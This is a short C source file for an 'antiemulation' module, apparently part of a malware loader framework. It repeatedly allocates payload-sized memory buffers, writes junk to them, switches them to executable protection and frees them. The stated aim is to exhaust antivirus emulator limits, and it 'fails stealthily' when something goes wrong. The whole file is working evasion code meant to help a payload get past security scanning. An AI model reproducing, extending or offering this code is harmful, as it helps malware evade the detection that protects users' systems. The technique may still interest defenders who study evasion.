/* MODULE: ANTIEMULATION
 * TYPE: sirallocalot
 * DESC: Allocates large memory chunks to exhaust emulator limits.
 * STRATEGY: Allocate RW -> Write -> Protect RX -> Free (Triple Loop)
 */
#include "../header/definitions.h"
#include <stdio.h>

#define SIR_ALLOC_COUNT 100
#define SIR_ITERATION_COUNT 5

void antiemulation() {
    void* allocs[SIR_ALLOC_COUNT];
    DWORD result;

    for(int i=0; i<SIR_ITERATION_COUNT; i++) {
        
        // 1. Allocation Loop
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            // Allocate RW
            allocs[n] = VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
            
            if (allocs[n]) {
                char *ptr = (char*)allocs[n];
                // Write junk (Touch memory to force allocation)
                for(int k=0; k<PAYLOAD_LEN; k++) {
                    ptr[k] = 0x23; // #
                }
            }
        }

        // 2. Protection Loop
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            if (allocs[n]) {
                 // Try to change to RX
                if (VirtualProtect(allocs[n], PAYLOAD_LEN, p_RX, &result) == 0) {
                    return; // Fail stealthily
                }
            }
        }

        // 3. Free Loop
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            if (allocs[n]) {
                VirtualFree(allocs[n], 0, 0x8000); // MEM_RELEASE
            }
        }
    }
}
